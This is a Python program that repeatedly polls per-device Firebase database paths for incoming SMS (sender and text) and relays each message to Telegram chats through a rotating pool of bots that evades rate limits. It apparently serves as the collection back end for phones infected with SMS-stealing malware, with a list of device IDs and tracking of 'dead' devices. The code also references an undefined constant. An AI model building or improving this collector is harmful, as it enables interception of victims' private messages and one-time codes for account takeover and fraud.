import asyncio
import json
import logging
import os
import signal
import time
from dataclasses import dataclass, field
from logging.handlers import RotatingFileHandler
from typing import Dict, List, Optional, Set

import aiohttp
from telegram import Bot
from telegram.error import RetryAfter, TelegramError

# --- Constants ---
CONFIG_FILE = "config.json"
DEVICE_IDS_FILE = "device_ids.txt"  # Deprecated
FIREBASE_SOURCES_FILE = "firebase_sources.json"
DEAD_DEVICES_DIR = "dead_devices"
DEAD_SOURCES_FILE = "dead_sources.txt"
LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, "bot.log")

RELOAD_INTERVAL = 300      # 5 minutes
SCAN_INTERVAL = 5          # 5 seconds
CLEANUP_INTERVAL = 1800    # 30 minutes
STATS_INTERVAL = 300       # 5 minutes
CACHE_TTL = 86400         # 24 hours
DEFAULT_CONCURRENT_LIMIT = 1000  # Increased to handle all devices in one wave
REQUEST_TIMEOUT = 7             # Reduced to prevent long spikes
DNS_CACHE_TTL = 300

# Edge Optimization Constants
LIMIT_TO_LAST = 5
QUERY_PARAMS = f'orderBy="$key"&limitToLast={LIMIT_TO_LAST}'

# Health Thresholds
MAX_CONSECUTIVE_NULL = 100
MAX_CONSECUTIVE_FAILURES = 10

# --- Logging Setup ---
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        RotatingFileHandler(LOG_FILE, maxBytes=10 * 1024 * 1024, backupCount=5),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# --- Data Models ---

@dataclass(frozen=True)
class SMS:
    id: str
    sender: str
    message: str
    type: str
    date_time: str
    source_name: str
    device_id: str

    def get_dedup_id(self) -> str:
        return f"{self.device_id}:{self.id}"

@dataclass
class FirebaseSource:
    name: str
    type: str  # "per_device" or "global"
    base_url: Optional[str] = None
    url: Optional[str] = None
    device_file: Optional[str] = None
    device_ids: List[str] = field(default_factory=list)
    consecutive_failures: int = 0
    is_disabled: bool = False

@dataclass
class TelegramBotConfig:
    token: str
    chat_id: str
    id: int = 0
    retry_after: float = 0
    is_down: bool = False

@dataclass
class AppConfig:
    telegram_bots: List[TelegramBotConfig] = field(default_factory=list)
    firebase_sources: List[FirebaseSource] = field(default_factory=list)

# --- Configuration Manager ---

class ConfigManager:
    def __init__(self):
        self.config: Optional[AppConfig] = None
        self.dead_devices: Dict[str, Set[str]] = {}  # Source Name -> Set of Device IDs
        self.dead_sources: Set[str] = set()

    def load_dead_entities(self):
        if not os.path.exists(DEAD_DEVICES_DIR):
            os.makedirs(DEAD_DEVICES_DIR)
        
        # Load source-specific dead devices
        for filename in os.listdir(DEAD_DEVICES_DIR):
            if filename.endswith(".txt"):
                source_name = filename[:-4]
                filepath = os.path.join(DEAD_DEVICES_DIR, filename)
                with open(filepath, "r") as f:
                    self.dead_devices[source_name] = {line.strip() for line in f if line.strip()}

        if os.path.exists(DEAD_SOURCES_FILE):
            with open(DEAD_SOURCES_FILE, "r") as f:
                self.dead_sources = {line.strip() for line in f if line.strip()}

    def is_device_dead(self, source_name: str, device_id: str) -> bool:
        return device_id in self.dead_devices.get(source_name, set())

    def save_dead_device(self, source_name: str, device_id: str):
        if source_name not in self.dead_devices:
            self.dead_devices[source_name] = set()
        
        if device_id not in self.dead_devices[source_name]:
            self.dead_devices[source_name].add(device_id)
            try:
                filepath = os.path.join(DEAD_DEVICES_DIR, f"{source_name}.txt")
                with open(filepath, "a") as f:
                    f.write(f"{device_id}\n")
                logger.warning(f"Device {device_id} marked dead on Source {source_name}")
            except Exception as e:
                logger.error(f"Failed to write to dead device file for {source_name}: {e}")

    def save_dead_source(self, source_url: str):
        self.dead_sources.add(source_url)
        try:
            with open(DEAD_SOURCES_FILE, "a") as f:
                f.write(f"{source_url}\n")
        except Exception as e:
            logger.error(f"Failed to write to {DEAD_SOURCES_FILE}: {e}")

    def validate_files_exist(self):
        required_files = [CONFIG_FILE, FIREBASE_SOURCES_FILE]
        for f in required_files:
            if not os.path.exists(f):
                logger.critical(f"Configuration file missing: {f}")
                return False
        
        if os.path.exists(DEVICE_IDS_FILE):
            logger.warning(f"DEPRECATED: Global '{DEVICE_IDS_FILE}' found. Please use source-specific device files.")
            
        return True

    async def load_all(self) -> bool:
        if not self.validate_files_exist():
            return False

        self.load_dead_entities()

        try:
            with open(CONFIG_FILE, "r") as f:
                base_cfg = json.load(f)
            
            bot_configs = []
            if "telegram_bots" in base_cfg and isinstance(base_cfg["telegram_bots"], list):
                for idx, b in enumerate(base_cfg["telegram_bots"]):
                    token = b.get("token")
                    chat_id = b.get("chat_id")
                    if not token or ":" not in token:
                        continue
                    bot_configs.append(TelegramBotConfig(token=token, chat_id=chat_id, id=len(bot_configs)+1))
            
            if not bot_configs:
                logger.critical("No valid Telegram bots found.")
                return False

            with open(FIREBASE_SOURCES_FILE, "r") as f:
                fb_data = json.load(f)
                sources = []
                for src_entry in fb_data:
                    if not src_entry.get("name") or not src_entry.get("type"):
                        continue
                    
                    url_key = src_entry.get("base_url") or src_entry.get("url")
                    if url_key in self.dead_sources:
                        continue

                    # Create source object
                    source = FirebaseSource(
                        name=src_entry["name"],
                        type=src_entry["type"],
                        base_url=src_entry.get("base_url"),
                        url=src_entry.get("url"),
                        device_file=src_entry.get("device_file")
                    )

                    # Load IDs if per-device
                    if source.type == "per_device":
                        if not source.device_file:
                            logger.error(f"Source {source.name} is 'per_device' but has no 'device_file' defined.")
                        elif not os.path.exists(source.device_file):
                            logger.warning(f"Source: {source.name} | Device File: {source.device_file} | MISSING")
                        else:
                            with open(source.device_file, "r") as df:
                                # Use dict.fromkeys to preserve order while removing duplicates
                                raw_ids = [line.strip() for line in df if line.strip()]
                                unique_ids = list(dict.fromkeys(raw_ids))
                                
                                # Filter out dead devices for this source
                                source.device_ids = [did for did in unique_ids if not self.is_device_dead(source.name, did)]
                                
                                logger.info(f"Source: {source.name} | Device File: {source.device_file} | Loaded IDs: {len(source.device_ids)}")
                                if not source.device_ids:
                                    logger.warning(f"Source: {source.name} | Device File: {source.device_file} | EMPTY or ALL DEAD")
                    
                    sources.append(source)

            self.config = AppConfig(
                telegram_bots=bot_configs,
                firebase_sources=sources
            )
            
            logger.info(f"Loaded Telegram Bots: {len(bot_configs)}")
            return True
        except Exception as e:
            logger.error(f"Error loading configuration: {e}")
            return False

    async def reload_loop(self):
        while True:
            await asyncio.sleep(RELOAD_INTERVAL)
            await self.load_all()

# --- Telegram Round Robin Worker ---

class TelegramWorker:
    def __init__(self, bot_configs: List[TelegramBotConfig]):
        self.bots = [Bot(token=b.token) for b in bot_configs]
        self.configs = bot_configs
        self.queue = asyncio.Queue()
        self._stop_event = asyncio.Event()
        self.current_index = 0
        self.pending_queue_ids: Set[str] = set()
        self.lock = asyncio.Lock()

    async def enqueue_sms(self, sms: SMS):
        dedup_key = sms.get_dedup_id()
        async with self.lock:
            if dedup_key in self.pending_queue_ids:
                logger.info(f"Duplicate SMS blocked in queue: {dedup_key}")
                return False
            
            self.pending_queue_ids.add(dedup_key)
            
            text = (
                f"📞 From: {sms.sender}\n\n"
                f"💬 Message:\n{sms.message}\n\n"
                f"📱 Source: {sms.source_name}\n"
                f"🔑 Device ID: {sms.device_id}"
            )
            
            await self.queue.put((dedup_key, text))
            logger.info(f"SMS Enqueued: {dedup_key}")
            return True

    async def run(self):
        logger.info(f"Telegram Delivery Worker Started")
        while not self._stop_event.is_set():
            try:
                queue_item = await self.queue.get()
                dedup_key, message_text = queue_item
                
                sent = False
                now = time.time()
                
                for config in self.configs:
                    if config.is_down and now >= config.retry_after:
                        config.is_down = False
                        logger.info(f"Telegram Bot #{config.id} recovered.")

                for _ in range(len(self.bots)):
                    idx = self.current_index % len(self.bots)
                    self.current_index += 1
                    config = self.configs[idx]
                    bot = self.bots[idx]
                    
                    if config.is_down:
                        continue
                    
                    try:
                        await bot.send_message(chat_id=config.chat_id, text=message_text)
                        logger.info(f"SMS Forwarded via Bot #{config.id}: {dedup_key}")
                        sent = True
                        break
                    except RetryAfter as e:
                        config.retry_after = time.time() + e.retry_after
                        config.is_down = True
                        logger.warning(f"Bot #{config.id} rate limited for {e.retry_after}s.")
                        continue
                    except TelegramError as e:
                        logger.error(f"Bot #{config.id} error: {e}")
                        continue

                if sent:
                    async with self.lock:
                        if dedup_key in self.pending_queue_ids:
                            self.pending_queue_ids.remove(dedup_key)
                    self.queue.task_done()
                else:
                    earliest_bot = min(self.configs, key=lambda c: c.retry_after)
                    wait_sec = max(1, earliest_bot.retry_after - time.time())
                    logger.warning(f"All bots rate limited. Waiting {wait_sec:.1f}s...")
                    await asyncio.sleep(wait_sec)
                    await self.queue.put(queue_item)
                    self.queue.task_done()

            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Unexpected error in Telegram worker: {e}")
                await asyncio.sleep(1)

    def stop(self):
        self._stop_event.set()

# --- Firebase Scanner & Cache ---

class FirebaseScanner:
    def __init__(self, config_mgr: ConfigManager, tg_worker: TelegramWorker):
        self.config_mgr = config_mgr
        self.tg_worker = tg_worker
        self.cache: Dict[str, float] = {}
        self.device_null_counts: Dict[str, int] = {}
        self.primed_urls: Set[str] = set()
        
        # Concurrency & Lock
        self.concurrent_limit = DEFAULT_CONCURRENT_LIMIT
        self.semaphore = asyncio.Semaphore(self.concurrent_limit)
        self.cache_lock = asyncio.Lock()

        # Metrics
        self.scan_durations: List[float] = []
        self.response_sizes: List[int] = []
        self.records_counts: List[int] = []
        
        # Performance Tracking
        self.slow_endpoints: List[tuple] = []
        self.timeout_count = 0
        self.retry_count = 0  
        self.error_count = 0

    async def stats_logger_task(self):
        while True:
            await asyncio.sleep(STATS_INTERVAL)
            if not self.config_mgr.config: continue
            
            avg_size = (sum(self.response_sizes) / len(self.response_sizes)) if self.response_sizes else 0
            avg_records = (sum(self.records_counts) / len(self.records_counts)) if self.records_counts else 0
            avg_duration = (sum(self.scan_durations) / len(self.scan_durations)) if self.scan_durations else 0

            stats = (
                "\n" + "-"*30 + "\n"
                "Monitoring Statistics\n"
                f"Active Firebase Sources: {len([s for s in self.config_mgr.config.firebase_sources if not s.is_disabled])}\n"
                f"Active Device IDs (Total): {sum(len(s.device_ids) for s in self.config_mgr.config.firebase_sources)}\n"
                f"Queue Size: {self.tg_worker.queue.qsize()}\n"
                f"Cache Size: {len(self.cache)}\n"
                f"Average Response Size: {avg_size:.1f} bytes\n"
                f"Average Records/Endpoint: {avg_records:.1f}\n"
                f"Average Scan Duration: {avg_duration:.2f}s\n"
                f"Concurrent Limit: {self.concurrent_limit}\n"
                f"Timeouts (Total): {self.timeout_count}\n"
                f"Errors (Total): {self.error_count}\n"
                + "-"*30
            )
            logger.info(stats)
            
            # Clear metrics to keep them recent
            self.response_sizes = self.response_sizes[-100:]
            self.records_counts = self.records_counts[-100:]
            self.scan_durations = self.scan_durations[-10:]

    async def cache_cleanup_task(self):
        while True:
            await asyncio.sleep(CLEANUP_INTERVAL)
            now = time.time()
            async with self.cache_lock:
                expired_ids = [k for k, v in self.cache.items() if now - v > CACHE_TTL]
                for k in expired_ids:
                    del self.cache[k]

    async def fetch_json(self, session: aiohttp.ClientSession, url: str, source: Optional[FirebaseSource] = None) -> Optional[dict]:
        start_fetch = time.time()
        async with self.semaphore:
            try:
                # Add optimization query params
                optimized_url = f"{url}?{QUERY_PARAMS}" if "?" not in url else f"{url}&{QUERY_PARAMS}"
                
                async with session.get(optimized_url, timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)) as response:
                    duration = time.time() - start_fetch
                    self.slow_endpoints.append((url, duration))
                    
                    if response.status == 200:
                        if source: source.consecutive_failures = 0
                        text_data = await response.text()
                        self.response_sizes.append(len(text_data))
                        data = json.loads(text_data)
                        
                        if source and source.name == "Firebase-2":
                            logger.info(f"[DEBUG-F2] URL: {optimized_url} | Raw records: {len(data) if isinstance(data, dict) else 0}")
                        
                        return data if isinstance(data, dict) else None
                    elif response.status in [403, 404]:
                        if source:
                            source.consecutive_failures += 1
                            if source.consecutive_failures >= MAX_CONSECUTIVE_LIMIT: # Note: MAX_CONSECUTIVE_FAILURES is 10
                                pass
                        return None
            except asyncio.TimeoutError:
                self.timeout_count += 1
            except Exception as e:
                self.error_count += 1
        return None

    def validate_sms(self, content: dict, sms_id: str, source_name: str, device_id: str) -> bool:
        if not sms_id or not str(sms_id).strip(): 
            if source_name == "Firebase-2": logger.info(f"[DEBUG-F2] SKIP_REASON: Missing id field for {sms_id}")
            return False
        if not content.get("sender") or not str(content.get("sender")).strip(): 
            if source_name == "Firebase-2": logger.info(f"[DEBUG-F2] SKIP_REASON: Missing sender field for {sms_id}")
            return False
        if not content.get("message") or not str(content.get("message")).strip(): 
            if source_name == "Firebase-2": logger.info(f"[DEBUG-F2] SKIP_REASON: Missing message field for {sms_id}")
            return False
        return True

    def parse_sms_data(self, data: dict, source_name: str, device_id: str) -> List[SMS]:
        sms_list = []
        if not data: return sms_list
        for sms_id, content in data.items():
            if not isinstance(content, dict): 
                if source_name == "Firebase-2": logger.info(f"[DEBUG-F2] SKIP_REASON: Invalid parser output (not a dict) for {sms_id}")
                continue
            
            # Firebase-1 Structure (Standard)
            if content.get("type") == "incoming" and self.validate_sms(content, sms_id, source_name, device_id):
                sms_list.append(SMS(
                    id=str(sms_id),
                    sender=str(content.get("sender")),
                    message=str(content.get("message")),
                    type="incoming",
                    date_time=str(content.get("dateTime", "")),
                    source_name=source_name,
                    device_id=device_id
                ))
            
            # Firebase-2 Structure (Mapping body -> message)
            elif source_name == "Firebase-2" and content.get("body") and content.get("sender"):
                body = str(content.get("body"))
                sender = str(content.get("sender"))
                timestamp = str(content.get("timestamp", ""))
                
                logger.info(f"[DEBUG-F2] Parsed Record: Key={sms_id} | Sender={sender} | Timestamp={timestamp}")
                
                new_sms = SMS(
                    id=str(sms_id),
                    sender=sender,
                    message=body,
                    type="incoming",
                    date_time=timestamp,
                    source_name=source_name,
                    device_id=device_id
                )
                sms_list.append(new_sms)
                logger.info(f"[DEBUG-F2] SMS Accepted: {new_sms.get_dedup_id()}")
            
            elif source_name == "Firebase-2":
                if content.get("type") != "incoming" and not content.get("body"):
                    logger.info(f"[DEBUG-F2] SKIP_REASON: Missing 'body' and not 'incoming' type for {sms_id}")
                elif not content.get("sender"):
                    logger.info(f"[DEBUG-F2] SKIP_REASON: Missing 'sender' for {sms_id}")
        return sms_list

    async def process_endpoint(self, session: aiohttp.ClientSession, url: str, source: FirebaseSource, device_id: str):
        if source.is_disabled: return
        
        is_url_already_primed = url in self.primed_urls
        data = await self.fetch_json(session, url, source)
        
        if not data:
            if device_id != "Global":
                cache_key = f"{source.name}:{device_id}"
                count = self.device_null_counts.get(cache_key, 0) + 1
                self.device_null_counts[cache_key] = count
                if count >= MAX_CONSECUTIVE_NULL:
                    self.config_mgr.save_dead_device(source.name, device_id)
            return
        else:
            if device_id != "Global":
                cache_key = f"{source.name}:{device_id}"
                self.device_null_counts[cache_key] = 0

        sms_list = self.parse_sms_data(data, source.name, device_id)
        
        if source.name == "Firebase-2":
            logger.info(f"[DEBUG-F2] {device_id} | Parsed SMS: {len(sms_list)} | Primed: {is_url_already_primed}")
            if data:
                latest_key = sorted(data.keys())[-1] if data else "N/A"
                logger.info(f"[DEBUG-F2] Latest Firebase key: {latest_key}")

        self.records_counts.append(len(sms_list))
        
        new_records_count = 0
        async with self.cache_lock:
            for sms in sms_list:
                dedup_id = sms.get_dedup_id()
                in_cache = dedup_id in self.cache
                
                if source.name == "Firebase-2":
                    logger.info(f"[DEBUG-F2] SMS: {dedup_id} | In Cache: {in_cache}")
                
                if in_cache:
                    if source.name == "Firebase-2": logger.info(f"[DEBUG-F2] SKIP_REASON: Already in cache for {dedup_id}")
                    continue
                
                if is_url_already_primed:
                    success = await self.tg_worker.enqueue_sms(sms)
                    if success:
                        self.cache[dedup_id] = time.time()
                        new_records_count += 1
                    elif source.name == "Firebase-2":
                        logger.info(f"[DEBUG-F2] SKIP_REASON: Duplicate dedup_id in TG Queue for {dedup_id}")
                else:
                    if source.name == "Firebase-2": logger.info(f"[DEBUG-F2] SKIP_REASON: Priming mode for {dedup_id}")
                    self.cache[dedup_id] = time.time()
        
        if not is_url_already_primed:
            logger.info(f"Primed endpoint: {url} | Cached: {len(sms_list)} records (Latest Only)")
            self.primed_urls.add(url)
        elif new_records_count > 0:
            if source.name == "Firebase-2":
                logger.info(f"[DEBUG-F2] Enqueued SMS Count: {new_records_count}")
            logger.info(f"Source {source.name}:{device_id} | SMS Found: {new_records_count}")

    async def run_forever(self):
        logger.info("Scanner Started")
        logger.info("Edge Optimization Enabled")
        logger.info(f"Limit To Last: {LIMIT_TO_LAST}")
        logger.info(f"Fixed Concurrency: {self.concurrent_limit}")
        
        # Use a high enough limit for the connector
        connector = aiohttp.TCPConnector(limit=self.concurrent_limit, ttl_dns_cache=DNS_CACHE_TTL)
        async with aiohttp.ClientSession(connector=connector) as session:
            while True:
                start_time = time.time()
                self.slow_endpoints = []
                
                await self.do_scan(session)
                
                duration = time.time() - start_time
                self.scan_durations.append(duration)
                
                # Identify slowest 20 endpoints
                self.slow_endpoints.sort(key=lambda x: x[1], reverse=True)
                top_20 = self.slow_endpoints[:20]
                
                wait_time = max(0.1, SCAN_INTERVAL - duration)
                if duration > SCAN_INTERVAL:
                    logger.warning(f"Scan took {duration:.2f}s. Slowest: {[(u.split('/')[-1], f'{d:.2f}s') for u, d in top_20]}")
                
                await asyncio.sleep(wait_time)

    async def do_scan(self, session: aiohttp.ClientSession):
        cfg = self.config_mgr.config
        if not cfg: return
        
        tasks = []
        for src in cfg.firebase_sources:
            if src.is_disabled: continue
            if src.type == "per_device":
                for dev_id in src.device_ids:
                    # Dead check already done during load, but extra safety
                    if self.config_mgr.is_device_dead(src.name, dev_id): continue
                    tasks.append(self.process_endpoint(session, f"{src.base_url}/{dev_id}.json", src, dev_id))
            elif src.type == "global":
                tasks.append(self.process_endpoint(session, src.url, src, "Global"))
        if tasks:
            await asyncio.gather(*tasks)

# --- Main Application ---

class SMSBot:
    def __init__(self):
        self.config_mgr = ConfigManager()
        self.tg_worker: Optional[TelegramWorker] = None
        self.scanner: Optional[FirebaseScanner] = None

    async def start(self):
        if not await self.config_mgr.load_all(): return

        self.tg_worker = TelegramWorker(self.config_mgr.config.telegram_bots)
        self.scanner = FirebaseScanner(self.config_mgr, self.tg_worker)

        tasks = [
            asyncio.create_task(self.tg_worker.run()),
            asyncio.create_task(self.scanner.run_forever()),
            asyncio.create_task(self.scanner.cache_cleanup_task()),
            asyncio.create_task(self.scanner.stats_logger_task()),
            asyncio.create_task(self.config_mgr.reload_loop())
        ]

        if os.name != 'nt':
            loop = asyncio.get_running_loop()
            for sig in (signal.SIGINT, signal.SIGTERM):
                loop.add_signal_handler(sig, lambda: asyncio.create_task(self.shutdown(tasks)))

        logger.info("SMS Bot is fully operational")
        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            pass
        finally:
            await self.shutdown(tasks)

    async def shutdown(self, tasks):
        if self.tg_worker: self.tg_worker.stop()
        for task in tasks:
            if not task.done(): task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

async def main():
    bot = SMSBot()
    try:
        await bot.start()
    except (KeyboardInterrupt, asyncio.CancelledError):
        pass

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
